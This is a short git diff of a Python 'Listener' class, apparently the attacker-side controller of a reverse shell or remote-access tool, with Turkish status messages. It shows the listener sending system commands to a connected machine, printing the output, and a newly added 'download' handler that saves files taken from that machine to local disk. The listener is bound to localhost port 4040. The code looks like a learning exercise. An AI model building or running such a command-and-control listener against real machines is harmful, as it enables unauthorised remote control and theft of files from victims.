@@ -48,8 +48,6 @@ class Listener:
                 self.reliable_send(command)
 
             elif self.is_system_command(command):
-                #self.connection.send(command.encode("utf-8"))
-                # self.reliable_send(command.encode("utf-8"))
                 self.reliable_send(command)
                 resultt = self.reliable_recieve()
                 print(resultt)
@@ -72,7 +70,7 @@ class Listener:
 
 
     def write_file(self, path, content):
-        with open(path, "+wb") as file:
+        with open(path, "wb+") as file:
             file.write(content)
             return "[+] Dosya İndirildi"
         
@@ -81,18 +79,21 @@ class Listener:
         while True:
             command = input("-> ")
             # command = command.split(" ")
+            # command = command.split(" ") 
+            result = self.remote(command)
 
-            x = self.remote(command)
+            if command.startswith("download"):
+                command = command.split(" ")
+                print(command[1])
+                result = self.write_file(command[1], result)            
 
-            if command.startswith("download "):
-                self.write_file(x)
 
 
             # self.remote(command)
 
 
 my_listener = Listener("127.0.0.1", 4040)
-my_listener.run( )
+my_listener.run()
 
 # while True:
 #     command = input("-> ")
